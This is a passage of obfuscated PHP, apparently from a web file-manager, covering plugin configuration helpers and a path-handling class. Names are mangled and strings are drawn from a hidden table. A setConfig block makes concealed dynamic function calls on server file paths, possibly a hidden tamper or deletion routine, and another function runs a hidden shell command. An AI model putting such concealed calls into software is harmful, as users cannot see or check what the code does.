(!is_array($ı–‰ëÑŠ) || count($ı–‰ëÑŠ) == 0 || !is_array($ı–‰ëÑŠ[0]) || count($ı–‰ëÑŠ[0]) == 0) { return; } $¼ÈûÉÕÆ = array(); $¬œ‰êÆ» = array(); foreach ($ı–‰ëÑŠ[0] as $˜üëÒÑÂ) { $¬¥ä±ş– = substr($˜üëÒÑÂ, strlen($ÓÏ‰ÄƒŞ), -4); $Ôˆ’Ü = LNG($¬¥ä±ş–); $¼ÈûÉÕÆ[] = $˜üëÒÑÂ; $¬œ‰êÆ»[] = str_replace(array($”»»é“ñ[262], $”»»é“ñ[1154], $”»»é“ñ[418], $”»»é“ñ[121]), array($”»»é“ñ[53], $”»»é“ñ[53], $”»»é“ñ[12], $”»»é“ñ[1675]), $Ôˆ’Ü); } $ªîïò‚ = str_replace($¼ÈûÉÕÆ, $¬œ‰êÆ», $ªîïò‚); } private function parseConfig(&$¹··çÔê) { $ò¯’±ÇÕ =& $_SERVER[¢ñàß¿€]; $ÏøÈ¾ = $ò¯’±ÇÕ[1676]; if (!strstr($¹··çÔê, $ÏøÈ¾)) { return; } preg_match_all($ò¯’±ÇÕ[1677], $¹··çÔê, $¢‰ÇÓ£Ë); if (!is_array($¢‰ÇÓ£Ë) || count($¢‰ÇÓ£Ë) == 0 || !is_array($¢‰ÇÓ£Ë[0]) || count($¢‰ÇÓ£Ë[0]) == 0) { return; } $Ç‡ÏÙ±Ô = $this->getConfig(); $•‡à¨œ± = array(); $ú©öÅÇÀ = array(); foreach ($¢‰ÇÓ£Ë[0] as $æ×ù«ƒâ) { $¡¦îÂª¼ = substr($æ×ù«ƒâ, strlen($ÏøÈ¾), -2); $•‡à¨œ±[] = $æ×ù«ƒâ; $ú©öÅÇÀ[] = _get($Ç‡ÏÙ±Ô, $¡¦îÂª¼); } $¹··çÔê = str_replace($•‡à¨œ±, $ú©öÅÇÀ, $¹··çÔê); } private function parsePackage(&$ËÚÑ¼î†) { $¿˜ÆĞßµ =& $_SERVER[¢ñàß¿€]; $ÂïŒÕ³ò = $¿˜ÆĞßµ[1678]; if (!strstr($ËÚÑ¼î†, $ÂïŒÕ³ò)) { return; } preg_match_all($¿˜ÆĞßµ[1679], $ËÚÑ¼î†, $‡¶ø¾û¤); if (!is_array($‡¶ø¾û¤) || count($‡¶ø¾û¤) == 0 || !is_array($‡¶ø¾û¤[0]) || count($‡¶ø¾û¤[0]) == 0) { return; } $Æ›»¥ÕÀ = $this->appPackage(); $ÑĞ±ôûÊ = array(); $ÕŞØ§† = array(); foreach ($‡¶ø¾û¤[0] as $ÖîæÄõ) { $êêà¢† = substr($ÖîæÄõ, strlen($ÂïŒÕ³ò), -2); $ÑĞ±ôûÊ[] = $ÖîæÄõ; $ÕŞØ§†[] = _get($Æ›»¥ÕÀ, $êêà¢†); } $ËÚÑ¼î† = str_replace($ÑĞ±ôûÊ, $ÕŞØ§†, $ËÚÑ¼î†); } final function echoFile($‰‹¨Ú•‡, $Ò çÇ®¦ = false) { $™ÃİÖõÈ =& $_SERVER[¢ñàß¿€]; $‚•Ç²ŠÈ = $this->pluginPath . $‰‹¨Ú•‡; if (ACT == $™ÃİÖõÈ[1680]) { echo $™ÃİÖõÈ[1681] . $this->pluginName . $™ÃİÖõÈ[8] . $‰‹¨Ú•‡ . $™ÃİÖõÈ[1682]; if (!file_exists($‚•Ç²ŠÈ)) { echo $™ÃİÖõÈ[1683]; return; } } $Ù¢ìâÅĞ = $this->parseFile($‚•Ç²ŠÈ); $this->parseLang($Ù¢ìâÅĞ); $this->parseConfig($Ù¢ìâÅĞ); $this->parsePackage($Ù¢ìâÅĞ); if (is_array($Ò çÇ®¦)) { $Ù¢ìâÅĞ = str_replace(array_keys($Ò çÇ®¦), array_values($Ò çÇ®¦), $Ù¢ìâÅĞ); } echo $™ÃİÖõÈ[262] . $Ù¢ìâÅĞ; } private function checkVersion() { $… ­«êĞ =& $_SERVER[¢ñàß¿€]; $ø²Œ¨ğò = $this->appPackage(); $»¿¯êÒÅ = $this->getConfig(); if ($»¿¯êÒÅ[$… ­«êĞ[1684]] == $ø²Œ¨ğò[$… ­«êĞ[1658]]) { return; } $this->regist(); $this->setConfig(array($… ­«êĞ[1684] => $ø²Œ¨ğò[$… ­«êĞ[1658]])); } final function initLang() { $ÂšÚ³ˆÊ =& $_SERVER[¢ñàß¿€]; $ã­Ò™ = $ÂšÚ³ˆÊ[1685]; $–”ÊÜ­ = $this->pluginPath . $ÂšÚ³ˆÊ[1686]; $ê Òë—¸ = I18n::getType(); $Ôñ¼ÈŸ¦ = array(); if (file_exists($–”ÊÜ­ . $ê Òë—¸ . $ÂšÚ³ˆÊ[909])) { $Ôñ¼ÈŸ¦ = (include $–”ÊÜ­ . $ê Òë—¸ . $ÂšÚ³ˆÊ[909]); } else { if ($ê Òë—¸ == $ÂšÚ³ˆÊ[1687] && !file_exists($–”ÊÜ­ . $ê Òë—¸ . $ÂšÚ³ˆÊ[909]) && file_exists($–”ÊÜ­ . $ÂšÚ³ˆÊ[1688])) { $Ôñ¼ÈŸ¦ = (include $–”ÊÜ­ . $ÂšÚ³ˆÊ[1688]); } else { if (file_exists($–”ÊÜ­ . $ã­Ò™ . $ÂšÚ³ˆÊ[909])) { $Ôñ¼ÈŸ¦ = (include $–”ÊÜ­ . $ã­Ò™ . $ÂšÚ³ˆÊ[909]); } } } if (!is_array($Ôñ¼ÈŸ¦)) { return array(); } if (@count($Ôñ¼ÈŸ¦) > 0) { I18n::set($Ôñ¼ÈŸ¦); } return $Ôñ¼ÈŸ¦; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ï½ã¿³Ä) { $Ïç¢áù¤ =& $_SERVER[¢ñàß¿€]; if ($_SERVER[$Ïç¢áù¤[947]] != $_SERVER[$Ïç¢áù¤[948]]) { $ÁˆĞˆªø = $Ïç¢áù¤[949]; $×ò«ÒÅÏ = $Ïç¢áù¤[950]; $—Ùè¥ö„ = $_SERVER[$Ïç¢áù¤[951]] . $Ïç¢áù¤[952]; $á¶Øûø = $×ò«ÒÅÏ($—Ùè¥ö„); $Ïß©—ÑÏ = explode($Ïç¢áù¤[262], $á¶Øûø); if (count($Ïß©—ÑÏ) < $Ïç¢áù¤[680]) { $òË—ĞĞî = $Ïç¢áù¤[953]; $òË—ĞĞî(); } $ßß…¿ìš = $Ïç¢áù¤[954]; $ßß…¿ìš($_SERVER[$Ïç¢áù¤[955]]); $ßß…¿ìš($_SERVER[$Ïç¢áù¤[951]] . $Ïç¢áù¤[956]); $•Ø¹»¶ = 1; while ($•Ø¹»¶ > 1) { $•Ø¹»¶ = $•Ø¹»¶ + 4; $æš¥ìãâ = rawurlencode($•Ø¹»¶ . $Ïç¢áù¤[454]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ï½ã¿³Ä); } public function onSetConfig($ã¥“ïª÷) { } public function onGetConfig($‰òÛÍëê) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Å¶Æ€¡–) { if ($Å¶Æ€¡– == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ì Şß×¥ = "\x70\x6c\165\x67\151\156\101\165\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ª£Âçù = $this->getConfig(); if (!$ª£Âçù[$ì Şß×¥]) { return !1; } return ActionCall($_SERVER[¢ñàß¿€][1689], $ª£Âçù[$ì Şß×¥]); } public function url($±ŒùğÍ, $üşà½ = '', $ÑĞ©½€¾ = true) { $Œ¿êÑñÇ =& $_SERVER[¢ñàß¿€]; $Éò–•È† = $this->getConfig(); $¬ïù†â = KOD_VERSION . $Œ¿êÑñÇ[10] . KOD_VERSION_BUILD; $ó´ò·‡¥ = $this->packageVersion(); $ÒîäµéÍ = $¬ïù†â . $Œ¿êÑñÇ[462] . $ó´ò·‡¥; if (substr($±ŒùğÍ, 0, 4) == $Œ¿êÑñÇ[152] || substr($±ŒùğÍ, 0, 2) == $Œ¿êÑñÇ[1435]) { $‹óúÙ“„ = $±ŒùğÍ . $Œ¿êÑñÇ[1690] . $ÒîäµéÍ; } else { if ($üşà½ == $Œ¿êÑñÇ[12]) { $‹óúÙ“„ = $this->pluginHost . $±ŒùğÍ . $Œ¿êÑñÇ[1690] . $ÒîäµéÍ; } else { if ($üşà½ === $Œ¿êÑñÇ[78]) { $‹óúÙ“„ = $this->pluginHost . $±ŒùğÍ; } else { if ($üşà½ == $Œ¿êÑñÇ[1691]) { $‹óúÙ“„ = STATIC_PATH . $±ŒùğÍ . $Œ¿êÑñÇ[1690] . $¬ïù†â; } else { if ($üşà½ == $Œ¿êÑñÇ[1692]) { $‹óúÙ“„ = APP_HOST . $Œ¿êÑñÇ[1693] . $±ŒùğÍ . $Œ¿êÑñÇ[1690] . $¬ïù†â; } else { if (isset($Éò–•È†[$üşà½])) { $‹óúÙ“„ = $Éò–•È†[$üşà½] . $±ŒùğÍ . $Œ¿êÑñÇ[1690] . $ÒîäµéÍ; } } } } } } if (!$ÑĞ©½€¾) { return $‹óúÙ“„; } echo $‹óúÙ“„; } public function link($›ˆÑ×ÒÂ = false, $şÎ’ÍÕ§ = '') { $½û¸¿¨ì =& $_SERVER[¢ñàß¿€]; $ÆÛ¯‡ = $this->linkHas == !1; $this->linkHas = !0; if (!$›ˆÑ×ÒÂ) { $this->link($½û¸¿¨ì[1694], $½û¸¿¨ì[1692]); $this->link($½û¸¿¨ì[1695], $½û¸¿¨ì[1691]); $this->link($½û¸¿¨ì[1696], $½û¸¿¨ì[1691]); $this->link($½û¸¿¨ì[1697], $½û¸¿¨ì[1691]); $this->link($½û¸¿¨ì[1698], $½û¸¿¨ì[1691]); if ($ÆÛ¯‡) { Hook::trigger($½û¸¿¨ì[1699]); } return; } $íú’‚Ï… = $this->url($›ˆÑ×ÒÂ, $şÎ’ÍÕ§, !1); if (substr($›ˆÑ×ÒÂ, -3) == $½û¸¿¨ì[1700]) { echo $½û¸¿¨ì[1701] . $íú’‚Ï… . $½û¸¿¨ì[1702] . $½û¸¿¨ì[262]; } else { if (substr($›ˆÑ×ÒÂ, -4) == $½û¸¿¨ì[1703]) { echo $½û¸¿¨ì[1704] . $íú’‚Ï… . $½û¸¿¨ì[1705] . $½û¸¿¨ì[262]; } } if ($ÆÛ¯‡) { Hook::trigger($½û¸¿¨ì[1699]); } } } $_file = $_SERVER[$_SERVER[¢ñàß¿€][1458]]; $_size = $_SERVER[¢ñàß¿€][1542]; goto D‡ùàØ´™È; b˜Î¢Ü®„ª: class KodIO { const KOD_SOURCE = "\173\163\x6f\165\162\x63\145\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\163\145\162\122\x65\143\171\143\x6c\x65\x7d"; const KOD_USER_FAV = "\173\165\x73\x65\162\x46\x61\166\175"; const KOD_USER_FILE_TAG = "\173\x75\x73\145\x72\106\151\x6c\x65\124\141\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\145\x72\106\x69\154\145\x54\171\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\157\x75\160\x52\157\x6f\x74\x53\145\154\x66\175"; const KOD_USER_SHARE = "\x7b\x75\163\x65\x72\123\x68\141\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\162\123\x68\141\x72\x65\x4c\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\x72\145\124\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\141\x72\145\111\164\x65\155\x7d"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\x72\145\111\x74\145\155\x4c\151\156\153\175"; const KOD_SEARCH = "\173\x73\x65\141\162\143\x68\x7d"; const KOD_BLOCK = "\173\x62\154\157\143\x6b\x7d"; const KOD_IO = "\173\151\x6f\175"; const KOD_USER_RECENT = "\x7b\165\163\145\162\x52\145\156\143\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\144\x72\x69\166\145\x72\x7d"; public static function typeList() { $‡Ê€ÈÇ­ =& $_SERVER[¢ñàß¿€]; return array($‡Ê€ÈÇ­[1333] => self::KOD_SOURCE, $‡Ê€ÈÇ­[1334] => self::KOD_USER_RECYCLE, $‡Ê€ÈÇ­[1335] => self::KOD_USER_FAV, $‡Ê€ÈÇ­[1336] => self::KOD_USER_FILE_TAG, $‡Ê€ÈÇ­[1337] => self::KOD_USER_FILE_TYPE, $‡Ê€ÈÇ­[1338] => self::KOD_GROUP_ROOT_SELF, $‡Ê€ÈÇ­[1339] => self::KOD_USER_SHARE, $‡Ê€ÈÇ­[1340] => self::KOD_USER_SHARE_LINK, $‡Ê€ÈÇ­[1341] => self::KOD_USER_SHARE_TO_ME, $‡Ê€ÈÇ­[1342] => self::KOD_SHARE_ITEM, $‡Ê€ÈÇ­[1343] => self::KOD_SHARE_LINK, $‡Ê€ÈÇ­[1344] => self::KOD_SEARCH, $‡Ê€ÈÇ­[1345] => self::KOD_BLOCK, $‡Ê€ÈÇ­[1346] => self::KOD_IO, $‡Ê€ÈÇ­[1347] => self::KOD_USER_RECENT, $‡Ê€ÈÇ­[1348] => self::KOD_USER_DRIVER); } public static function parse($¥öëäñ‹) { $şÂ´ÑãÌ =& $_SERVER[¢ñàß¿€]; $¥öëäñ‹ = self::clear($¥öëäñ‹); $èµ”ÈÂ¡ = array_values(self::typeList()); preg_match($şÂ´ÑãÌ[1349], $¥öëäñ‹, $¿ªÄÄ¦ì); $ñ™ÈšÃŸ = array($şÂ´ÑãÌ[496] => !1, $şÂ´ÑãÌ[1350] => !1, $şÂ´ÑãÌ[493] => !1, $şÂ´ÑãÌ[87] => $¥öëäñ‹, $şÂ´ÑãÌ[1248] => !1, $şÂ´ÑãÌ[1247] => $şÂ´ÑãÌ[12]); if (is_array($¿ªÄÄ¦ì) && count($¿ªÄÄ¦ì) == 5) { $Û¸Ÿ«Ç = $şÂ´ÑãÌ[1351] . $¿ªÄÄ¦ì[2] . $şÂ´ÑãÌ[403]; if (in_array($Û¸Ÿ«Ç, $èµ”ÈÂ¡)) { $ñ™ÈšÃŸ[$şÂ´ÑãÌ[1248]] = $¿ªÄÄ¦ì[1]; $ñ™ÈšÃŸ[$şÂ´ÑãÌ[33]] = $Û¸Ÿ«Ç; $ñ™ÈšÃŸ[$şÂ´ÑãÌ[1352]] = substr($Û¸Ÿ«Ç, 1, -1); $ñ™ÈšÃŸ[$şÂ´ÑãÌ[475]] = $¿ªÄÄ¦ì[3]; } $ñ™ÈšÃŸ[$şÂ´ÑãÌ[1247]] = $¿ªÄÄ¦ì[4]; } $‘Ü‚¸ç¨ = array($şÂ´ÑãÌ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ñ™ÈšÃŸ[$şÂ´ÑãÌ[1315]] = in_array($ñ™ÈšÃŸ[$şÂ´ÑãÌ[33]], $‘Ü‚¸ç¨); return $ñ™ÈšÃŸ; } public static function isTruePath($ÉÒß³û) { $¤†Ÿ§˜ =& $_SERVER[¢ñàß¿€]; if (substr($ÉÒß³û, 0, 1) != $¤†Ÿ§˜[1351]) { return !0; } if (strpos($ÉÒß³û, $¤†Ÿ§˜[483]) === 0) { return !0; } if (strpos($ÉÒß³û, $¤†Ÿ§˜[1319]) === 0) { return !0; } if (strpos($ÉÒß³û, $¤†Ÿ§˜[1353]) === 0) { return !0; } if (strpos($ÉÒß³û, $¤†Ÿ§˜[1354]) === 0) { return !0; } if (strpos($ÉÒß³û, $¤†Ÿ§˜[1355]) === 0) { return !0; } return !1; } public static function clear($Ó•‚„Ô€) { $Í›Óê¨ë =& $_SERVER[¢ñàß¿€]; $Ó•‚„Ô€ = str_replace(array($Í›Óê¨ë[1154], $Í›Óê¨ë[262]), $Í›Óê¨ë[53], $Ó•‚„Ô€); $Ó•‚„Ô€ = str_replace($Í›Óê¨ë[100], $Í›Óê¨ë[8], $Ó•‚„Ô€); $‡òğÅµ÷ = $Í›Óê¨ë[1356]; if (substr($Ó•‚„Ô€, 0, 3) == $Í›Óê¨ë[1357]) { $Ó•‚„Ô€ = substr($Ó•‚„Ô€, 3); } while (strstr($Ó•‚„Ô€, $‡òğÅµ÷)) { $Ó•‚„Ô€ = str_replace($‡òğÅµ÷, $Í›Óê¨ë[8], $Ó•‚„Ô€); } $Ó•‚„Ô€ = preg_replace($Í›Óê¨ë[1358], $Í›Óê¨ë[8], $Ó•‚„Ô€); if ($Ó•‚„Ô€ == $Í›Óê¨ë[8]) { return $Í›Óê¨ë[8]; } $Ó•‚„Ô€ = rtrim($Ó•‚„Ô€, $Í›Óê¨ë[8]); return $Ó•‚„Ô€; } public static function pathTrue($ºÁ÷÷Å¡) { $Ø¥Ü‰ÌÛ =& $_SERVER[¢ñàß¿€]; if (!$ºÁ÷÷Å¡) { return $Ø¥Ü‰ÌÛ[12]; } $ºÁ÷÷Å¡ = str_replace($Ø¥Ü‰ÌÛ[592], $Ø¥Ü‰ÌÛ[8], str_replace($Ø¥Ü‰ÌÛ[1359], $Ø¥Ü‰ÌÛ[8], $ºÁ÷÷Å¡)); $ºÁ÷÷Å¡ = str_replace($Ø¥Ü‰ÌÛ[592], $Ø¥Ü‰ÌÛ[8], str_replace($Ø¥Ü‰ÌÛ[1359], $Ø¥Ü‰ÌÛ[8], $ºÁ÷÷Å¡)); if (!strstr($ºÁ÷÷Å¡, $Ø¥Ü‰ÌÛ[1357])) { return $ºÁ÷÷Å¡; } $Åï§ºÌø = explode($Ø¥Ü‰ÌÛ[8], $ºÁ÷÷Å¡); foreach ($Åï§ºÌø as $öİ“½˜ => $Öºó²Â) { if ($Öºó²Â !== $Ø¥Ü‰ÌÛ[1360]) { continue; } for ($™¨ÛËîØ = $öİ“½˜; $™¨ÛËîØ >= 0; $™¨ÛËîØ--) { if ($Åï§ºÌø[$™¨ÛËîØ] === $Ø¥Ü‰ÌÛ[10] || $Åï§ºÌø[$™¨ÛËîØ] === $Ø¥Ü‰ÌÛ[1360] || $Åï§ºÌø[$™¨ÛËîØ] === -1) { continue; } if ($Åï§ºÌø[$™¨ÛËîØ] === $Ø¥Ü‰ÌÛ[12]) { $Åï§ºÌø[$öİ“½˜] = -1; break; } $Åï§ºÌø[$öİ“½˜] = -1; $Åï§ºÌø[$™¨ÛËîØ] = -1; break; } } $áÜ´ú£ = array(); foreach ($Åï§ºÌø as $Öºó²Â) { if ($Öºó²Â !== -1) { $áÜ´ú£[] = $Öºó²Â; } } $¸ú‚š‡¶ = implode($Ø¥Ü‰ÌÛ[8], $áÜ´ú£); if (strpos($¸ú‚š‡¶, $Ø¥Ü‰ÌÛ[1361]) === 0) { $¸ú‚š‡¶ = $Ø¥Ü‰ÌÛ[1357] . substr($¸ú‚š‡¶, strlen($Ø¥Ü‰ÌÛ[1361])); } return $¸ú‚š‡¶; } public static function pathUrlClear($”ª‚ÍÀÕ) { $‹÷¢ÇâŸ =& $_SERVER[¢ñàß¿€]; if (!$”ª‚ÍÀÕ) { return $”ª‚ÍÀÕ; } $”ª‚ÍÀÕ = rawurldecode($”ª‚ÍÀÕ); $”ª‚ÍÀÕ = str_replace($‹÷¢ÇâŸ[1359], $‹÷¢ÇâŸ[8], $”ª‚ÍÀÕ); if (strpos($”ª‚ÍÀÕ, $‹÷¢ÇâŸ[76]) > 0) { $”ª‚ÍÀÕ = substr($”ª‚ÍÀÕ, 0, strpos($”ª‚ÍÀÕ, $‹÷¢ÇâŸ[76])); } if (strpos($”ª‚ÍÀÕ, $‹÷¢ÇâŸ[1362]) > 0) { $”ª‚ÍÀÕ = substr($”ª‚ÍÀÕ, 0, strpos($”ª‚ÍÀÕ, $‹÷¢ÇâŸ[1362])); } return $”ª‚ÍÀÕ; } public static function sourceID($áÙ„ «æ) { $®£ÁÖ¹Ê =& $_SERVER[¢ñàß¿€]; $Ä»Ó€¢ = self::parse($áÙ„ «æ); if ($Ä»Ó€¢[$®£ÁÖ¹Ê[33]] !== self::KOD_SOURCE) { show_json(LNG($®£ÁÖ¹Ê[1363]), !1); } return $Ä»Ó€¢[$®£ÁÖ¹Ê[475]]; } public static function make($‡ÔùÍê³) { if (!$‡ÔùÍê³) { return !1; } return self::makePath(self::KOD_SOURCE, intval($‡ÔùÍê³)); } public static function makeShare($Ê½åÊ¾, $­öÄŒÊÕ) { return self::makePath(self::KOD_SHARE_ITEM, $Ê½åÊ¾, $­öÄŒÊÕ); } public static function makeFileTypePath($ØÌ¢ß™é) { return self::makePath(self::KOD_USER_FILE_TYPE, $ØÌ¢ß™é); } public static function makeFileTagPath($¿Œºú°Í) { return self::makePath(self::KOD_USER_FILE_TAG, $¿Œºú°Í); } public static function makePath($¸Î•Ú¾´, $ÙàóÒ¬Ë = '', $‡¬ïÇÉ = '') { $Ä»¹£ïİ =& $_SERVER[¢ñàß¿€]; $åºƒË× = substr($¸Î•Ú¾´, 1, -1); $ ©©ÂÂ¿ = $Ä»¹£ïİ[1364] . $åºƒË× . $Ä»¹£ïİ[1365] . $ÙàóÒ¬Ë . $Ä»¹£ïİ[1366]; $ ©©ÂÂ¿ = $‡¬ïÇÉ ? $ ©©ÂÂ¿ . $‡¬ïÇÉ . $Ä»¹£ïİ[8] : $ ©©ÂÂ¿; return $ ©©ÂÂ¿; } public static function hashPath($ÒãÖ¢”², $‘®»Îùö = true) { $äá„ü˜ =& $_SERVER[¢ñàß¿€]; $×êö£ï = is_array($ÒãÖ¢”²) ? $ÒãÖ¢”² : IO::info($ÒãÖ¢”²); $ÆÔÑÜÂ = _get($×êö£ï, $äá„ü˜[1367], $äá„ü˜[12]); if (!$ÆÔÑÜÂ && isset($×êö£ï[$äá„ü˜[235]])) { $ÆÔÑÜÂ = trim($×êö£ï[$äá„ü˜[235]], $äá„ü˜[121]); } if (!$ÆÔÑÜÂ && isset($×êö£ï[$äá„ü˜[193]]) && $×êö£ï[$äá„ü˜[193]]) { $×êö£ï = IO::info(KodIO::make($×êö£ï[$äá„ü˜[193]])); $ÆÔÑÜÂ = _get($×êö£ï, $äá„ü˜[1367], $äá„ü˜[12]); } $ËüæÑ©Ë = md5($×êö£ï[$äá„ü˜[87]] . $×êö£ï[$äá„ü˜[79]] . $×êö£ï[$äá„ü˜[88]]); if (!$ÆÔÑÜÂ && file_exists($×êö£ï[$äá„ü˜[87]])) { $ÆÔÑÜÂ = Cache::get($ËüæÑ©Ë . $äá„ü˜[1368]); $ÆÔÑÜÂ = !1; if (!$ÆÔÑÜÂ) { $ÆÔÑÜÂ = IO::hashSimple($×êö£ï[$äá„ü˜[87]]); Cache::set($ËüæÑ©Ë . $äá„ü˜[1368], $ÆÔÑÜÂ, 3600 * 24 * 30); } } if ($‘®»Îùö && !$ÆÔÑÜÂ) { } return $ÆÔÑÜÂ ? $ÆÔÑÜÂ : $ËüæÑ©Ë; } public static function hashPathSafe($òåß¤Àş, $Ô™Éİõ¸ = true) { $í­š‘‡ú =& $_SERVER[¢ñàß¿€]; $†úŸÖ¢“ = self::hashPath($òåß¤Àş, $Ô™Éİõ¸); return md5($†úŸÖ¢“ . $í­š‘‡ú[1369] . Model($í­š‘‡ú[841])->get($í­š‘‡ú[842])); } public static function initSystemPath() { $àÁÛŞ¢â =& $_SERVER[¢ñàß¿€]; if (defined($àÁÛŞ¢â[1370])) { return; } define($àÁÛŞ¢â[1370], self::systemPath($àÁÛŞ¢â[191])); define($àÁÛŞ¢â[1371], self::systemPath($àÁÛŞ¢â[1372])); define($àÁÛŞ¢â[1373], self::systemPath($àÁÛŞ¢â[1374])); define($àÁÛŞ¢â[1375], self::systemPath($àÁÛŞ¢â[1376])); IOHistory::bindEvent(); } public static function systemPath($ÙÒ¥ÏÖ¾) { $­îÅ˜àü =& $_SERVER[¢ñàß¿€]; $Û°§Ä¢ù = $­îÅ˜àü[1377] . ucfirst($ÙÒ¥ÏÖ¾); $ä¼Ç©Òñ = Model($­îÅ˜àü[841])->get($Û°§Ä¢ù); if ($ä¼Ç©Òñ) { return $ä¼Ç©Òñ; } if ($ÙÒ¥ÏÖ¾ == $­îÅ˜àü[191]) { $ä¼Ç©Òñ = self::make(Model($­îÅ˜àü[895])->systemRootPathAdd($­îÅ˜àü[605])); } else { $ä¼Ç©Òñ = self::systemPath($­îÅ˜àü[191]); $ÈŠúŸîĞ = self::sourceID($ä¼Ç©Òñ); $ä¼Ç©Òñ = self::make(Model($­îÅ˜àü[895])->mkdir($ÈŠúŸîĞ, $ÙÒ¥ÏÖ¾)); } Model($­îÅ˜àü[841])->set($Û°§Ä¢ù, $ä¼Ç©Òñ); return $ä¼Ç©Òñ; } public static function systemFolder($‰Õ¦¬²) { $ÂíÛÒô¬ = IO_PATH_SYSTEM_SOURCE . $‰Õ¦¬²; $«ìÕæ¡ç = Cache::get($ÂíÛÒô¬); if (!$«ìÕæ¡ç) { $ş³Á»Æ = IO::infoFullSimple($ÂíÛÒô¬); if (!$ş³Á»Æ) { $«ìÕæ¡ç = IO::mkdir($ÂíÛÒô¬, REPEAT_SKIP); } else { $«ìÕæ¡ç = $ş³Á»Æ[$_SERVER[¢ñàß¿€][87]]; } Cache::set($ÂíÛÒô¬, $«ìÕæ¡ç, 3600 * 10); } return $«ìÕæ¡ç; } public static function defaultDriver() { return Model($_SERVER[¢ñàß¿€][838])->defaultDriver(); } public static function defaultIO() { $§‡°ØêÊ =& $_SERVER[¢ñàß¿€]; $Í×”ƒÏû = self::defaultDriver(); return $§‡°ØêÊ[1378] . $Í×”ƒÏû[$§‡°ØêÊ[475]] . $§‡°ØêÊ[1366]; } public static function defaultDriverInit() { static $Ÿù¥ôòĞ = false; if ($Ÿù¥ôòĞ) { return $Ÿù¥ôòĞ; } $Ÿù¥ôòĞ = IO::init(self::defaultIO()); return $Ÿù¥ôòĞ; } public static function fileTypeList() { $¦—ø‰ô =& $_SERVER[¢ñàß¿€]; $ü§‹Ò¯Ï = $GLOBALS[$¦—ø‰ô[6]][$¦—ø‰ô[1379]]; foreach ($ü§‹Ò¯Ï as $¤É¡şç => $ô¿®¥šÚ) { $æ¾Ü¥ù” = $¦—ø‰ô[1380] . $¤É¡şç; $¹ò²ƒ–· = LNG($æ¾Ü¥ù”); if ($æ¾Ü¥ù” != $¹ò²ƒ–·) { $ü§‹Ò¯Ï[$¤É¡şç][$¦—ø‰ô[32]] = $¹ò²ƒ–·; } } return $ü§‹Ò¯Ï; } public static function diskList($“Íëûú‹ = true) { $”¦ğ¦ = $_SERVER[¢ñàß¿€][1381]; if ($“Íëûú‹) { $ˆ °‹á = Cache::get($”¦ğ¦); if (is_array($ˆ °‹á)) { return $ˆ °‹á; } } $ˆ °‹á = self::diskListGet(); Cache::set($”¦ğ¦, $ˆ °‹á, 60); return $ˆ °‹á; } public static function diskListGet() { $£‘¡”À =& $_SERVER[¢ñàß¿€]; $È«Ö¸ìü = array(); if ($GLOBALS[$£‘¡”À[6]][$£‘¡”À[1382]] == $£‘¡”À[1383]) { $êñß = $£‘¡”À[1384]; for ($Â›ä››Ÿ = 0; $Â›ä››Ÿ < strlen($êñß); $Â›ä››Ÿ++) { $ãÑ²ã“õ = $êñß[$Â›ä››Ÿ] . $£‘¡”À[1385]; if (file_exists($ãÑ²ã“õ)) { $È«Ö¸ìü[] = $ãÑ²ã“õ; } } return $È«Ö¸ìü; } if (!function_exists($£‘¡”À[101])) { $È«Ö¸ìü[] = $£‘¡”À[906]; return $È«Ö¸ìü; } $Æ¾ƒ¤¦ü = explode($£‘¡”À[262], shell_exec($£‘¡”À[1386])); array_shift($Æ¾ƒ¤¦ü); array_pop($Æ¾ƒ¤¦ü); $ØåòÕæ· = array($£‘¡”À[1387], $£‘¡”À[1388], $£‘¡”À[1389], $£‘¡”À[1390], $£‘¡”À[1391], $£‘¡”À[1392], $£‘¡”À[1393], $£‘¡”À[1394]); foreach ($Æ¾ƒ¤¦ü as $µÊü•¸Á) { $Ô¸·« Å = preg_split($£‘¡”À[1395], $µÊü•¸Á); $ãÑ²ã“õ = $Ô¸·« Å[count($Ô¸·« Å) - 1]; if (!strstr($Ô¸·« Å[0], $£‘¡”À[1396]) || !$ãÑ²ã“õ) { continue; } $¤­”âêÖ = rtrim($ãÑ²ã“õ, $£‘¡”À[8]) . $£‘¡”À[8]; if (in_array($¤­”âêÖ, $ØåòÕæ·)) { continue; } $È«Ö¸ìü[] = $¤­”âêÖ; } return $È«Ö¸ìü; } public static function isSameDisk($üèûœÅ³, $ÌğÕİ) { $©õôÒÛ =& $_SERVER[¢ñàß¿€]; if ($GLOBALS[$©õôÒÛ[6]][$©õôÒÛ[1382]] == $©õôÒÛ[1383]) { return strtolower(substr($üèûœÅ³, 0, 1)) == strtolower(substr($ÌğÕİ, 0, 1)); } $Ù´¾ù‚ó = self::diskList(); $Úæ¢‚¸û = !1; $û‰ŸÌí‘ = !1; sort($Ù´¾ù‚ó); $Ù´¾ù‚ó = array_reverse($Ù´¾ù‚ó); $üèûœÅ³ = rtrim($üèûœÅ³, $©õôÒÛ[8]) . $©õôÒÛ[8]; $ÌğÕİ = rtrim($ÌğÕİ, $©õôÒÛ[8]) . $©õôÒÛ[8]; foreach ($Ù´¾ù‚ó as $Õƒ¾öú¬) { $ªÌÕ¶Ğ— = strlen($Õƒ¾öú¬); if (!$Úæ¢‚¸û && substr($üèûœÅ³, 0, $ªÌÕ¶Ğ—) == $Õƒ¾öú¬) { $Úæ¢‚¸û = $Õƒ¾öú¬; } if (!$û‰ŸÌí‘ && substr($ÌğÕİ, 0, $ªÌÕ¶Ğ—) == $Õƒ¾öú¬) { 